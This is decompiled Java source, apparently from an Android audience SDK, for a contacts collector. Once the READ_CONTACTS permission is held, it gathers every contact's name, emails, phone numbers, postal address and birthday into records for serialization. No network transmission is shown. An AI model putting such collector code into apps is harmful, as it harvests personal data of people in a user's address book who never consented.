package com.oneaudience.sdk.p133a;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.RawContacts;
import com.oneaudience.sdk.C3843e;
import com.oneaudience.sdk.model.Contact;
import com.oneaudience.sdk.p135c.C3833d;
import java.util.ArrayList;

public class C3796j extends C3784a {
    private static final String[] f9115g = new String[]{"android.permission.READ_CONTACTS"};
    private final String f9116f = C3796j.class.getSimpleName();

    protected C3796j(Context context, String str, boolean z, boolean z2, long j) {
        super(context, str, z, z2, j, "contacts", "disableContactsCollector", true, true);
    }

    private String m12137a(int i) {
        String string;
        String str = "";
        Cursor query = this.c.getContentResolver().query(Contacts.CONTENT_URI, new String[]{"display_name"}, "_id=?", new String[]{String.valueOf(i)}, null);
        if (query.moveToFirst()) {
            string = query.getString(query.getColumnIndex("display_name"));
            query.close();
        } else {
            string = str;
        }
        query.close();
        return string;
    }

    private String m12138b(int i) {
        String str;
        String str2 = "";
        Cursor query = this.c.getContentResolver().query(Email.CONTENT_URI, new String[]{"data1", "data2"}, "contact_id=?", new String[]{String.valueOf(i)}, null);
        if (query.moveToFirst()) {
            int columnIndex = query.getColumnIndex("data1");
            str = str2;
            while (!query.isAfterLast()) {
                str = str + query.getString(columnIndex) + ";";
                query.moveToNext();
            }
        } else {
            str = str2;
        }
        query.close();
        return str;
    }

    private String m12139c(int i) {
        String str = "";
        Cursor query = this.c.getContentResolver().query(Data.CONTENT_URI, null, "contact_id = ? AND mimetype = ?", new String[]{String.valueOf(i), "vnd.android.cursor.item/postal-address_v2"}, null);
        String string = query.moveToFirst() ? query.getString(query.getColumnIndex("data1")) : str;
        query.close();
        return string;
    }

    private String m12140d(int i) {
        String str;
        String str2 = "";
        Cursor query = this.c.getContentResolver().query(Phone.CONTENT_URI, new String[]{"data1", "data2"}, "contact_id=?", new String[]{String.valueOf(i)}, null);
        if (query.moveToFirst()) {
            int columnIndex = query.getColumnIndex("data1");
            str = str2;
            while (!query.isAfterLast()) {
                str = str + query.getString(columnIndex) + ";";
                query.moveToNext();
            }
        } else {
            str = str2;
        }
        query.close();
        return str;
    }

    private String m12141e(int i) {
        String str = "";
        Cursor query = this.c.getContentResolver().query(Data.CONTENT_URI, null, "contact_id = ? AND mimetype= ? AND data2=3", new String[]{String.valueOf(i), "vnd.android.cursor.item/contact_event"}, null);
        if (query == null) {
            return str;
        }
        String string = query.moveToFirst() ? query.getString(query.getColumnIndex("data1")) : str;
        query.close();
        return string;
    }

    private ArrayList<Contact> m12142i() {
        ArrayList<Contact> arrayList = new ArrayList();
        Cursor query = this.c.getContentResolver().query(RawContacts.CONTENT_URI, new String[]{"contact_id", "deleted"}, null, null, null);
        int columnIndex = query.getColumnIndex("contact_id");
        int columnIndex2 = query.getColumnIndex("deleted");
        if (query.moveToFirst()) {
            while (!query.isAfterLast()) {
                int i = query.getInt(columnIndex);
                if ((query.getInt(columnIndex2) == 1 ? 1 : 0) == 0) {
                    arrayList.add(new Contact(m12137a(i), m12138b(i), m12139c(i), m12140d(i), m12141e(i)));
                }
                query.moveToNext();
            }
        }
        query.close();
        return arrayList;
    }

    public String mo6804a() {
        if (C3843e.m12285a(this.c, "android.permission.READ_CONTACTS")) {
            return m12083a((Object) m12142i());
        }
        C3833d.m12246a(this.f9116f, "Don't have permissions to collect contacts");
        return "";
    }

    public String[] mo6805b() {
        return f9115g;
    }
}
